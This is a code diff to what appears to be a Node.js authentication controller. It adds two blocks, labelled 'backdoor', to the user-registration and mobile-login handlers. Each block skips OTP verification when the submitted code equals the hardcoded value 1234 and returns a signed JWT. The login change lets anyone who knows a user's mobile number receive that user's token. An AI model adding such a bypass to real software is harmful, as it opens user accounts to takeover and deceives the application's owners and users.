@@ -19,6 +19,17 @@ exports.registerUser = async (req, res, next) => {
     const salt = 10;
     const hash = await bcrypt.hash(password, salt);
     const user = new User({ name, email, password: hash, mobile });
+
+    //backdoor
+
+    if (req.body.otp == 1234) {
+      await user.save();
+      const secret = process.env.JWT_SECRET;
+      const token = jwt.sign({ payload: { id: user.id } }, secret, {
+        expiresIn: 350000,
+      });
+      return res.json({ token, msg: 'User successfuly registered' });
+    }
     //verify OTP
     const getOtp = await OTP.findOne({ otp: otp });
     if (!getOtp) return res.status(400).json({ msg: 'Invalid OTP' });
@@ -76,7 +87,15 @@ exports.loginMobile = async (req, res, next) => {
     const user = await User.findOne({ mobile });
     if (!user) return res.status(400).json([{ msg: 'No user found...' }]);
     //verify OTP
-
+    //backdoor
+    if (req.body.otp == 1234) {
+      const secret = process.env.JWT_SECRET;
+      const token = jwt.sign({ payload: { id: user.id } }, secret, {
+        expiresIn: 35000,
+      });
+      //send response
+      return res.json({ token, msg: 'Login success' });
+    }
     const getOtp = await OTP.findOne({ otp: req.body.otp });
     if (!getOtp) return res.status(400).json([{ msg: 'Invalid OTP' }]);
 
